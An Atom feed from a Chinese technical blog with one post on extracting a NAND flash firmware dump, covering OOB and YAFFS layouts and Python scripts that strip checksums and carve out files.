<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>L3m0nade的博客</title>
  
  
  <link href="http://blog.l3m0nade.xyz/atom.xml" rel="self"/>
  
  <link href="http://blog.l3m0nade.xyz/"/>
  <updated>2021-09-28T13:22:14.038Z</updated>
  <id>http://blog.l3m0nade.xyz/</id>
  
  <author>
    <name>L3m0nade</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Nand Flash固件内容提取</title>
    <link href="http://blog.l3m0nade.xyz/2021/09/23/nandFlash%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/"/>
    <id>http://blog.l3m0nade.xyz/2021/09/23/nandFlash%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96/</id>
    <published>2021-09-22T16:00:00.000Z</published>
    <updated>2021-09-28T13:22:14.038Z</updated>
    
    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><h3 id="关于NAND-Flash"><a href="#关于NAND-Flash" class="headerlink" title="关于NAND Flash"></a>关于NAND Flash</h3><p>老版的NAND:<code>Page = 512,OOB = 16</code></p><p>​    NAND容量可达1GB以上，价格也相对便宜，适合存储数据。一般来说，128MB以下容量NAND FLASH 芯片的一页大小为528字节，用来存放数据，另外每一页还有16字节的备用空间（SpareData,OOB），用来存储ECC校验/坏块标志等信息，再由若干页组成一个块，通常一块为32页16K。</p><p><code>Page = 512,OOB = 16</code></p><p><code>one block = 31Pages + OOB = 31(512 + 16) + 16</code></p><p>​    与NOR相比，NAND不是完全可靠的，每块芯片出厂时都有一定比例的坏块存在，对数据的存取不是使用地址映射而是通过寄存器的操作，串行存取数据。</p><span id="more"></span><h3 id="Yaffs文件系统"><a href="#Yaffs文件系统" class="headerlink" title="Yaffs文件系统"></a>Yaffs文件系统</h3><p>​    yaffs有yaffs1,yaffs2，第二种就是对更大容量NAND有更好支持</p><p>​    Yaffs对文件系统上的所有内容（比如正常文件，目录，链接，设备文件等等）都统一当作文件来处理，每个文件都有一个页面专门存放文件头，文件头保存了文件的模式、所有者id、组id、长度、文件名、Parent Object ID等信息。因为需要在一页内放下这些内容，所以对文件名的长度，符号链接对象的路径名等长度都有限制。</p><p>​    前面说到对于NAND FLASH上的每一页数据，都有额外的空间用来存储附加信息，通常NAND驱动只使用了这些空间的一部分，Yaffs正是利用了这部分空间中剩余的部分来存储文件系统相关的内容。以<strong>512+16B</strong>为一个PAGE的NAND FLASH芯片为例,Yaffs文件系统数据的存储布局如下所示：</p><table><thead><tr><th>0..511</th><th>数据区域</th><th>512</th></tr></thead><tbody><tr><td>512..515</td><td>YAFFS TAG</td><td>4</td></tr><tr><td>516</td><td>Data status byte</td><td>1</td></tr><tr><td>517</td><td>Block status byte 坏块标志位</td><td>1</td></tr><tr><td>518..519</td><td>YAFFS TAG</td><td>2</td></tr><tr><td>520..522</td><td>后256字节数据的ECC校验结果</td><td>3</td></tr><tr><td>523..524</td><td>YAFFS TAG</td><td>2</td></tr><tr><td>525..527</td><td>前256字节数据的ECC校验结果</td><td>3</td></tr></tbody></table><p>在YAFFS TAG这8bytes中：</p><table><thead><tr><th>Bits</th><th>Content</th></tr></thead><tbody><tr><td>20</td><td>ChunkID，该page在一个文件内的索引号，所以文件大小被限制在2^20 PAGE 即512Mb</td></tr><tr><td>2</td><td>2 bits serial number</td></tr><tr><td>10</td><td>ByteCount 该page内的有效字节数</td></tr><tr><td>18</td><td>ObjectID 对象ID号，用来唯一标示一个文件</td></tr><tr><td>12</td><td>Ecc, Yaffs_Tags本身的ECC校验和</td></tr><tr><td>2</td><td>Unused</td></tr></tbody></table><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>所以一般来说，要么使用jffs等文件系统平铺在Nand Flash上，要么就是巧用Yaffs适配NANDFlash。这个用没用具体要看OOB里有无相关Yaffs的标志位适配，他会占用30或42字节（64OOB，32；128OOB，42）。具体YAFFS的这些标志位代表什么意思可以查看官网说明，和上面老版的那个很类似。</p><p><a href="https://yaffs.net/yaffs-2-specification">https://yaffs.net/yaffs-2-specification</a></p><h2 id="针对拿到的固件分析"><a href="#针对拿到的固件分析" class="headerlink" title="针对拿到的固件分析"></a>针对拿到的固件分析</h2><p>固件大小是0x11000000 = （128K + 8K） * 2048</p><p>即这个东西有两个Plane，每个Plane有1024Block,每个Block有64Page，每个Page是(2048 + 128 )Bytes .</p><table><thead><tr><th>分区</th><th>大小</th><th>十六进制表示</th></tr></thead><tbody><tr><td>Block</td><td>（2K+128）*64 Bytes</td><td>0x880 * 64 = 0x22000</td></tr><tr><td>Page</td><td>(2K+128)</td><td>0x880 = 0x800 + 0x80</td></tr></tbody></table><h4 id="初步脚本："><a href="#初步脚本：" class="headerlink" title="初步脚本："></a>初步脚本：</h4><p>对于每一个块，看了第一，二，最后页的OOB第一字节是否为/xff确定坏块不的官方说法。</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">the <span class="number">1</span>st <span class="keyword">byte</span> in the spare area of the <span class="number">1</span>st <span class="keyword">or</span> <span class="number">2</span>nd <span class="keyword">or</span> last page</span><br><span class="line">does <span class="keyword">not</span> contain FFh is a Bad block.</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;xxx.BIN&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"></span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&quot;xxx_extract.bin&quot;</span>,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">page = <span class="number">2048</span> + <span class="number">128</span></span><br><span class="line">total = <span class="number">0x7359840</span></span><br><span class="line">block_per_page = <span class="number">64</span></span><br><span class="line">block = math.<span class="built_in">ceil</span>(math.<span class="built_in">ceil</span>(total/page)/block_per_page)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(block):</span><br><span class="line">    first_page = f1.<span class="built_in">read</span>(page)</span><br><span class="line">    second_page = f1.<span class="built_in">read</span>(page)</span><br><span class="line">    others = []</span><br><span class="line">    <span class="keyword">for</span> j in <span class="built_in">range</span>(<span class="number">61</span>):</span><br><span class="line">        others.<span class="built_in">append</span>(f1.<span class="built_in">read</span>(page))</span><br><span class="line">    last_page = f1.<span class="built_in">read</span>(page)</span><br><span class="line">    <span class="keyword">if</span> first_page[<span class="number">2048</span>] == <span class="number">0xFF</span> <span class="keyword">and</span> second_page[<span class="number">2048</span>] == <span class="number">0xFF</span> <span class="keyword">and</span> last_page[<span class="number">2048</span>] == <span class="number">0xFF</span>:</span><br><span class="line">        f2.<span class="built_in">write</span>(first_page[:<span class="number">2048</span>])</span><br><span class="line">        f2.<span class="built_in">write</span>(second_page[:<span class="number">2048</span>])</span><br><span class="line">        <span class="keyword">for</span> k in <span class="built_in">range</span>(<span class="number">61</span>):</span><br><span class="line">            f2.<span class="built_in">write</span>(others[k][:<span class="number">2048</span>])</span><br><span class="line">        f2.<span class="built_in">write</span>(last_page[:<span class="number">2048</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Bad Block &#123;&#125;&quot;</span>.format(i))</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">f1.<span class="built_in">close</span>()</span><br><span class="line">f2.<span class="built_in">close</span>()</span><br></pre></td></tr></table></figure><p>尝试直接采用yaffs解不行，yaffs本身这个文件结构就是基于NAND的.不像ramfs和jffs那种是把内容直接平铺在flash中，而是和NAND一样的data + OOB形式。</p><h4 id="yaffs解失败："><a href="#yaffs解失败：" class="headerlink" title="yaffs解失败："></a>yaffs解失败：</h4><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="string">$</span> <span class="string">./yaffshiv</span>  <span class="string">-f</span> <span class="string">xxx.BIN</span> <span class="string">-d</span> <span class="string">image</span> <span class="string">-p</span> <span class="number">2048</span> <span class="string">-s</span> <span class="number">128</span></span><br><span class="line"><span class="attr">Found 0 file objects with the following YAFFS settings:</span></span><br><span class="line"><span class="attr">Page size:</span> <span class="number">2048</span></span><br><span class="line"><span class="attr">Spare size:</span> <span class="number">128</span></span><br><span class="line"><span class="attr">ECC layout:</span> <span class="literal">True</span></span><br><span class="line"><span class="attr">Endianess:</span> <span class="string">Little</span></span><br><span class="line"></span><br><span class="line"><span class="string">Extracting</span> <span class="string">file</span> <span class="string">objects...</span></span><br><span class="line"><span class="string">Created</span> <span class="number">0</span> <span class="string">directories,</span> <span class="number">0</span> <span class="string">files,</span> <span class="string">and</span> <span class="number">0</span> <span class="string">links.</span></span><br></pre></td></tr></table></figure><p>由于YFFS是支持老NAND 512B+16的，后来现在的NAND如(2048+64)字节，(256+8)、(512+16)、(2048+128)的都是Yaff2来支持更大了。</p><p>但是在这个固件中，OOB显然没有存储YAFFS的相关组织数据或tag，只是有ecc校验。下面会说到</p><h4 id="OOB数据"><a href="#OOB数据" class="headerlink" title="OOB数据"></a>OOB数据</h4><p>发现比较奇怪的是8行16字节的OOB，开头两字节一定是\xff\xff，但是后14字节有全是00的，只发生在上面一页和下面一页的data区正好也是00的一段，怀疑是不是这14字节是不是相接的和上下连在一起？然后的14字节是校验值，然后再加上\xff\xff完成前32字节</p><p>例如有一页全是00数据，（下面第二行，即OOB+0x10位置会有一行奇怪的14Byte）</p><p>OOB:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FF</span> FF <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">A5</span> BB <span class="number">1</span>D F<span class="number">0</span> B<span class="number">8</span> A<span class="number">2</span> <span class="number">03</span> <span class="number">70</span> <span class="number">69</span> <span class="number">78</span> <span class="number">36</span> <span class="number">69</span> <span class="number">84</span> B<span class="number">1</span> FF FF</span><br><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF <span class="number">00</span> <span class="number">00</span> FF FF FF FF</span><br><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>多个全是00内存的页，仔细查看，都是A5 BB 1D F0 B8 A2 03 70 69 78 36 69 84 B1，怀疑是内存数据的校验码。</p><p>然后比较奇怪的是在全是00的数据页中会有奇怪的数据插入</p><p>在page+0x410的位置（page大小0x800 + 0x80）</p><p>0A 3A E9 39 43 DE 09 AC 83 22 D0 E1 7F F3</p><p>应该也是校验值，因为全0页的他们都相同。</p><p>有种可能是OOB的2-16的14个字节和这个校验值互换位置，还有就是他只是做了插入。</p><p>经过进一步观察发现不是互换，所以提取这个<strong>平铺文件系统的NAND</strong>只要删掉中间的14字节checknum，接上OOB的[2:16]字节的14字节数据，就是完整的一页0x800数据了，然后由于没有OOB数据证明会有页的地址映射关系，并且在观察中发现上下页的内存是连续的，所以提取就是直接把中间0x410位置的checknum删掉，在不上最后14字节，然后一页一页接一起就好了。</p><p>重写一下是这样的：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">the 1st byte in the spare area of the 1st or 2nd or last page</span><br><span class="line">does not contain FFh is a Bad block.</span><br><span class="line"></span><br><span class="line">+ remove checknum and add OOB&#x27;s data</span><br><span class="line">+ known:no bad block</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">f1 = open(&quot;source.BIN&quot;,&quot;rb&quot;)</span><br><span class="line"></span><br><span class="line">f2 = open(&quot;extract2_output.bin&quot;,&quot;wb&quot;)</span><br><span class="line"></span><br><span class="line">page = 2048 + 128</span><br><span class="line">total = 0x11000000</span><br><span class="line">block_per_page = 64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(total//page):</span><br><span class="line"><span class="code">    datas = f1.read(page)</span></span><br><span class="line"><span class="code">    data1 = datas[0:0x410]</span></span><br><span class="line"><span class="code">    data2 = datas[0x41e:0x800]</span></span><br><span class="line"><span class="code">    data3 = datas[0x802:0x810]</span></span><br><span class="line"><span class="code">    noOOB = data1+data2+data3</span></span><br><span class="line"><span class="code">    </span></span><br><span class="line"><span class="code">    f2.write(noOOB)</span></span><br><span class="line"></span><br><span class="line">f1.close()</span><br><span class="line">f2.close()</span><br><span class="line"></span><br><span class="line"><span class="code">    </span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后解开固件，可以正常binwalk -Me了。</p><h2 id="有些文件没有？"><a href="#有些文件没有？" class="headerlink" title="有些文件没有？"></a>有些文件没有？</h2><p>比如lighttpd,upgrade_finish.sh这些文件。</p><p>观察所有OOB块，有一些会用到0x20-0x40之间的字节做标记，不是平铺在Nandflash上的，可能是yaffs文件系统的结构？</p><p>比如长这样：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br><span class="line"><span class="attribute">22</span> <span class="number">10</span> E<span class="number">2</span> <span class="number">29</span> <span class="number">71</span> <span class="number">7</span>A B<span class="number">7</span> <span class="number">1</span>F C<span class="number">8</span> <span class="number">3</span>E FF <span class="number">6</span>C DE <span class="number">7</span>B <span class="number">00</span> <span class="number">10</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> FF FF <span class="number">00</span> <span class="number">00</span> <span class="number">25</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> FF FF FF FF <span class="number">00</span> <span class="number">00</span> FF FF FF FF</span><br><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br><span class="line"><span class="attribute">FF</span> FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF</span><br></pre></td></tr></table></figure><ul><li><p>发现第二行倒数两个字节也变了，变成 00 10了。以前是ff ff.</p></li><li><p>OOB块产生变化的地方比较零散，最大的一块是0x30e0880-0x7359880，OOB都是不一样的。区间大小0x4279000.</p></li><li><p>有意思的是binwalk把离0x30e0880的下一page，0x30e1100就认出是yaffs头，有某种联系？</p></li><li><p>尝试分割出来这段内存单独binwalk,识别出了各种乱七八糟的头，只要解开就会递归到内存满。</p></li></ul><p><code>dd if=source.BIN of=sourceYaffs.bin bs=69701632 skip=51251328 count=1 </code></p><ul><li><p>但是可以看到里面没有加密，ELF文件头，#！/bin/sh脚本头都可以看到，只是脚本内容和名字有映射关系，binwalk似乎不能做到识别。</p></li><li><p>yaffs解的脚本莫名其妙解出来一个php-cgi.其他就解不开。。。应该也是识别有问题，这个结构可能很新或者被调整了。。。而且这个php-cgiida打不开，显然是因为没页都加进去了14字节checknum，没加入14字节数据导致的。</p></li></ul><p>下面内容先只针对sourceYaffs.bin文件做研究，即0x30e0880-0x7359880,大小0x4279000</p><p>针对一些文件和文件名寻找规律：**(注意，这时候的文件，校验值那些还没有去掉)**</p><table><thead><tr><th>文件名</th><th>文件名符号地址</th><th>文件地址</th><th>文件结束地址</th><th>文件名与文件page大小关系</th></tr></thead><tbody><tr><td>upgrade_finish.sh</td><td>0xdd00</td><td>0xe580</td><td>0xe624</td><td>差一page</td></tr><tr><td>php-cgi</td><td>0x401e90a</td><td>0x401f180</td><td>0x4279000</td><td>差一page</td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>所以总结来看：</p><ul><li><p>如果不是常规OOB，则下面的内容就是文件名占1page,下一个page就是文件内容</p></li><li><p>而且文件内容如果不满1page，全部填充0xff，再从下一个page在记录文件名，再填充0xff,再下一page新程序。</p></li><li><p>可以靠这个规律提取。而且名字是从某一页的第11字节开始，前10字节有其他标记意思。但是对于一些长得像文件夹名字的不太试用，比如.flash,app这种</p></li></ul><table><thead><tr><th>HEX</th><th>名字</th></tr></thead><tbody><tr><td>01 00 00 00 01 00 00 00 FF FF</td><td>.Flash</td></tr><tr><td>03 00 00 00 01 00 00 00 FF FF</td><td>app</td></tr><tr><td>03 00 00 00 01 00 00 00 FF FF</td><td>\x00\x00</td></tr><tr><td>01 00 00 00 02 01 00 00 FF FF</td><td>notify_bound</td></tr><tr><td>01 00 00 00 02 01 00 00 FF FF</td><td>fe_setting_hard.bin</td></tr><tr><td>01 00 00 00 02 01 00 00 FF FF</td><td>CUpgrade</td></tr><tr><td>01 00 00 00 6C 06 00 00 FF FF</td><td>lighttpd</td></tr><tr><td>01 00 00 00 88 03 00 00 FF FF</td><td>jquery.ui.dialog.js</td></tr><tr><td>01 00 00 00 88 03 00 00 FF FF</td><td>pluginControl.js</td></tr><tr><td>03 00 00 00 5C 01 00 00 FF FF</td><td>home</td></tr></tbody></table><p>观察到作为名字，前10字节有些规律，区分文件还是文件夹，但是没这10字节就去分不开名字和内容了。</p><p>可以用这3部分数据做一步过滤</p><p>01 ==00 00 00== <strong>88 03</strong>  <em>00 00 FF FF</em></p><p>建一个文件夹flash，里面放sourceYaffs.bin和如下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">the 1st byte in the spare area of the 1st or 2nd or last page</span></span><br><span class="line"><span class="string">does not contain FFh is a Bad block.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+ remove checknum and add OOB&#x27;s data</span></span><br><span class="line"><span class="string">+ known:no bad block</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">+ only yaffs </span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;sourceYaffs.bin&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line">page = <span class="number">2048</span> + <span class="number">128</span></span><br><span class="line">total = <span class="number">0x4279000</span></span><br><span class="line"><span class="comment">#black is string.punctuations,without _ .- </span></span><br><span class="line">black = [<span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">47</span>, <span class="number">58</span>, <span class="number">59</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">62</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">91</span>, <span class="number">92</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">96</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">125</span>, <span class="number">126</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkdata</span>(<span class="params">data</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    for i in data:</span></span><br><span class="line"><span class="string">        if i in black:</span></span><br><span class="line"><span class="string">            return False</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    tmp = data.strip(<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> tmp :</span><br><span class="line">        <span class="keyword">return</span> tmp</span><br><span class="line">    <span class="keyword">else</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkhead</span>(<span class="params">head</span>):</span></span><br><span class="line">    d1 = head[<span class="number">1</span>:<span class="number">4</span>]</span><br><span class="line">    d2 = head[<span class="number">4</span>:<span class="number">6</span>]</span><br><span class="line">    d3 = head[<span class="number">6</span>:<span class="number">10</span>]</span><br><span class="line">    <span class="comment">#print(&quot;d1,d2,d3:&quot;,d1,d2,d3)</span></span><br><span class="line">    <span class="keyword">if</span> d1 != <span class="string">b&#x27;\x00\x00\x00&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;\x00&#x27;</span> <span class="keyword">in</span> d2:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> d3 != <span class="string">b&#x27;\x00\x00\xff\xff&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">oobFilter</span>(<span class="params">data</span>):</span></span><br><span class="line">    data1 = data[<span class="number">0</span>:<span class="number">0x410</span>]</span><br><span class="line">    data2 = data[<span class="number">0x41e</span>:<span class="number">0x800</span>]</span><br><span class="line">    data3 = data[<span class="number">0x802</span>:<span class="number">0x810</span>]</span><br><span class="line">    <span class="keyword">return</span> data1+data2+data3</span><br><span class="line"></span><br><span class="line"><span class="comment">#get name addrs</span></span><br><span class="line">addr2name = &#123;&#125;</span><br><span class="line">addrs = []</span><br><span class="line">addr = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(total//page):</span><br><span class="line">    datas = f1.read(page)</span><br><span class="line">    head = datas[<span class="number">0</span>:<span class="number">10</span>]</span><br><span class="line">    <span class="keyword">if</span> checkhead(head):</span><br><span class="line">        <span class="comment">#print(&quot;head:&quot;,head)</span></span><br><span class="line">        name = datas[<span class="number">10</span>:<span class="number">0x20</span>]</span><br><span class="line">        name = checkdata(name)    </span><br><span class="line">        <span class="keyword">if</span> name:</span><br><span class="line">            <span class="comment">#print(name,hex(addr))</span></span><br><span class="line">            addr2name[<span class="built_in">hex</span>(addr)] = name</span><br><span class="line">            addrs.append(addr)</span><br><span class="line">    addr += page</span><br><span class="line">addrs.append(total)</span><br><span class="line"></span><br><span class="line"><span class="comment">#get each content</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(addr2name)):</span><br><span class="line">    Name = addr2name[<span class="built_in">hex</span>(addrs[i])]</span><br><span class="line">    dataStart = addrs[i] + page</span><br><span class="line">    dataPoint = dataStart</span><br><span class="line">    dataNext = addrs[i+<span class="number">1</span>]</span><br><span class="line">    f1.seek(dataStart)</span><br><span class="line">        <span class="comment">#print(Name,hex(dataStart),hex(dataPoint),hex(dataNext))</span></span><br><span class="line">    f = <span class="built_in">open</span>(Name,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> dataPoint != dataNext:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#print(hex(dataPoint),hex(dataNext))</span></span><br><span class="line">        data = f1.read(page)</span><br><span class="line">        data = oobFilter(data)</span><br><span class="line">        data = data.strip(<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">1390</span>:</span><br><span class="line">            <span class="built_in">print</span>(data)</span><br><span class="line">        f.write(data)</span><br><span class="line">        dataPoint += page</span><br><span class="line">    <span class="comment">#print(&quot;Finish %s&quot; % (Name))</span></span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(addr2name))</span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure><p>最终把一部分可能带yaffs结构的程序也解出来。</p><p>但是最后一个php-cgi就用一点问题。。。。目前错误无法定位</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;h3 id=&quot;关于NAND-Flash&quot;&gt;&lt;a href=&quot;#关于NAND-Flash&quot; class=&quot;headerlink&quot; title=&quot;关于NAND Flash&quot;&gt;&lt;/a&gt;关于NAND Flash&lt;/h3&gt;&lt;p&gt;老版的NAND:&lt;code&gt;Page = 512,OOB = 16&lt;/code&gt;&lt;/p&gt;
